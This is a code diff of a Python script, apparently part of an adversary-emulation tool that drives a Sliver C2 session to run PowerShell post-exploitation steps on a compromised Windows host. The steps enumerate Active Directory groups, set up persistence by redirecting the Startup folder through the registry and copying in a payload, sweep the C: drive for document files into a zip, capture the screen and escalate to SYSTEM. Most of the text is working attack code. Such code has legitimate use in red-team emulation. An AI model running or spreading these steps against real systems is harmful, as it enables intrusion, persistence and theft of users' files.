@@ -28,7 +28,7 @@ def confirm_action(prompt: str = "Keep going with the next attack step?") -> boo
 async def main():
     print_welcome_message()
     from attack_executor.config import load_config
-    config = load_config(config_file_path="/home/kali/Desktop/Aurora-executor-demo/config.ini")
+    config = load_config(config_file_path="/home/kali/Desktop/xiangmu/attack_executor-main/aurora/executor/config.ini")
     from attack_executor.post_exploit.Sliver import SliverExecutor
     sliver_executor = SliverExecutor(config=config)
     console.print("""\
@@ -64,18 +64,10 @@ async def main():
 
     user_params["SessionID"] = sliver_sessionid
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: powershell[/]")
     confirm_action()
-    try:
-        await sliver_executor.powershell(user_params["SessionID"], user_params["Commands"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
-
-    confirm_action()
-    commands = """
+    commands = rf"""
     Get-AdGroup -Filter *
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -136,10 +128,33 @@ async def main():
     confirm_action()
 
     confirm_action()
-    commands = """
-    New-Item -ItemType Directory -path "#{new_startup_folder}"
-    Copy-Item -path "#{payload}" -destination "#{new_startup_folder}"
-    Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "#{new_startup_folder}"
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 12 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: new_startup_folder[/]")
+    console.print(f"  Description: new startup folder to replace standard one")
+    default_val = "$env:TMP\atomictest"
+    user_input = console.input(
+        f"[bold]➤ Enter value for new_startup_folder [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: new_startup_folder")
+    user_params["new_startup_folder"] = user_input
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 12 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: payload[/]")
+    console.print(f"  Description: executable to be placed in new startup location ")
+    default_val = "C:\Windows\System32\calc.exe"
+    user_input = console.input(
+        f"[bold]➤ Enter value for payload [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: payload")
+    user_params["payload"] = user_input
+    commands = rf"""
+    New-Item -ItemType Directory -path "{user_params["new_startup_folder"]}"
+    Copy-Item -path "{user_params["payload"]}" -destination "{user_params["new_startup_folder"]}"
+    Set-ItemProperty -Path  "HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders" -Name "Startup" -Value "{user_params["new_startup_folder"]}"
+
     """
     await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
@@ -169,87 +184,80 @@ async def main():
         raise
 
     confirm_action()
-    commands = """
-    Compress-Archive -Path "#{input_file}" -DestinationPath #{output_file} -Force
-    """
-    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
-    print_finished_message()
-
-    confirm_action()
-    commands = """
-    $startingDirectory = "C:"
-    $outputZip = "#{output_zip_folder_path}"
-    $fileExtensionsString = ".doc, .docx, .txt"
-    $fileExtensions = $fileExtensionsString -split ", "
-    New-Item -Type Directory $outputZip -ErrorAction Ignore -Force | Out-Null
-    Function Search-Files {
-    param (
-    [string]$directory
-    )
-    $files = Get-ChildItem -Path $directory -File -Recurse | Where-Object {
-    $fileExtensions -contains $_.Extension.ToLower()
-    }
-    return $files
-    }
-    $foundFiles = Search-Files -directory $startingDirectory
-    if ($foundFiles.Count -gt 0) {
-    $foundFilePaths = $foundFiles.FullName
-    Compress-Archive -Path $foundFilePaths -DestinationPath "$outputZip\data.zip"
-    Write-Host "Zip file created: $outputZip\data.zip"
-    } else {
-    Write-Host "No files found with the specified extensions."
-    }
-    """
-    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
-
-    print_finished_message()
-
-    confirm_action()
-    commands = """
-    Add-Type -AssemblyName System.Windows.Forms
-    $screen = [Windows.Forms.SystemInformation]::VirtualScreen
-    $bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height
-    $graphic = [Drawing.Graphics]::FromImage($bitmap)
-    $graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size)
-    $bitmap.Save("#{output_file}")
-    """
-    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
-
-    print_finished_message()
-
-    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 18 Parameter Input[/]")
-    console.print(f"[bold yellow]  Parameter: hosting_process[/]")
-    console.print(f"  Description: Target process ID or name for privilege escalation")
-    default_val = ""
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 15 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_file[/]")
+    console.print(f"  Description: Location to save zipped file or folder")
+    default_val = "None"
     user_input = console.input(
-        f"[bold]➤ Enter value for hosting_process [default: {default_val}]: [/]"
+        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
     ) or default_val
     if not user_input and False:
-        raise ValueError("Missing required parameter: hosting_process")
-    user_params["hosting_process"] = user_input
+        raise ValueError("Missing required parameter: output_file")
+    user_params["output_file"] = user_input
 
-    console.print(f"[bold cyan]\n📌[Sliver Executor] Step 18 Parameter Input[/]")
-    console.print(f"[bold yellow]  Parameter: config[/]")
-    console.print(f"  Description: Configuration options for escalation method")
-    default_val = "Service"
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 15 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: input_file[/]")
+    console.print(f"  Description: Location of file or folder to zip")
+    default_val = "None"
     user_input = console.input(
-        f"[bold]➤ Enter value for config [default: {default_val}]: [/]"
+        f"[bold]➤ Enter value for input_file [default: {default_val}]: [/]"
     ) or default_val
     if not user_input and False:
-        raise ValueError("Missing required parameter: config")
-    user_params["config"] = user_input
+        raise ValueError("Missing required parameter: input_file")
+    user_params["input_file"] = user_input
+    commands = rf"""
+    Compress-Archive -Path "{user_params["input_file"]}" -DestinationPath {user_params["output_file"]} -Force
 
-    user_params["SessionID"] = sliver_sessionid
+    """
+    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
 
-    # Sliver command execution
-    console.print(f"[bold cyan]\n[Sliver Executor] Executing: get_system[/]")
+    print_finished_message()
+
     confirm_action()
-    try:
-        await sliver_executor.get_system(user_params["hosting_process"], user_params["config"], user_params["SessionID"])
-    except Exception as e:
-        console.print(f"[bold red]✗ Command failed: {str(e)}[/]")
-        raise
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 16 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_zip_folder_path[/]")
+    console.print(f"  Description: Path to directory for saving the generated zip file")
+    default_val = "PathToAtomicsFolder\..\ExternalPayloads\T1005"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_zip_folder_path [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_zip_folder_path")
+    user_params["output_zip_folder_path"] = user_input
+    commands = """
+    $startingDirectory="C:"; $outputZip="#{output_zip_folder_path}"; $fileExtensions=@(".doc",".docx",".txt"); New-Item -Type Directory $outputZip -Force -ErrorAction Ignore | Out-Null; Get-ChildItem -Path $startingDirectory -Recurse -File | Where-Object {$_.Extension -in $fileExtensions} | ForEach-Object -Begin {$files=@()} -Process {$files += $_.FullName} -End {if ($files) { Compress-Archive -Path $files -DestinationPath "$outputZip\data.zip"; Write-Host "Zip file created: $outputZip\data.zip" } else { Write-Host "No files found" }}
+
+    """
+    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
+
+    print_finished_message()
+
+    confirm_action()
+
+    console.print(f"[bold cyan]\n📌[PowerShell Executor] Step 17 Parameter Input[/]")
+    console.print(f"[bold yellow]  Parameter: output_file[/]")
+    console.print(f"  Description: Path where captured results will be placed")
+    default_val = "$env:TEMP\T1113.png"
+    user_input = console.input(
+        f"[bold]➤ Enter value for output_file [default: {default_val}]: [/]"
+    ) or default_val
+    if not user_input and False:
+        raise ValueError("Missing required parameter: output_file")
+    user_params["output_file"] = user_input
+    commands = rf"""
+    Add-Type -AssemblyName System.Windows.Forms;$screen = [Windows.Forms.SystemInformation]::VirtualScreen;$bitmap = New-Object Drawing.Bitmap $screen.Width, $screen.Height;$graphic = [Drawing.Graphics]::FromImage($bitmap);$graphic.CopyFromScreen($screen.Left, $screen.Top, 0, 0, $bitmap.Size);$bitmap.Save("{user_params["output_file"]}")
+
+    """
+    await sliver_executor.powershell(session_id=sliver_sessionid,input_commands=commands)
+
+    print_finished_message()
+
+    console.print("[bold green][MANUAL ACTION REQUIRED][/bold green]")
+    console.print("In the Sliver C2 console, execute the [bold green]getsystem[/bold green] command on a session with local administrator privileges to obtain a session under the NT AUTHORITY\SYSTEM account. Once elevated system privileges are acquired, you can select this high-privilege session to perform subsequent operations.")
+    confirm_action()
+    sliver_sessionid = await sliver_executor.select_sessions()
 
     confirm_action()
     commands = """
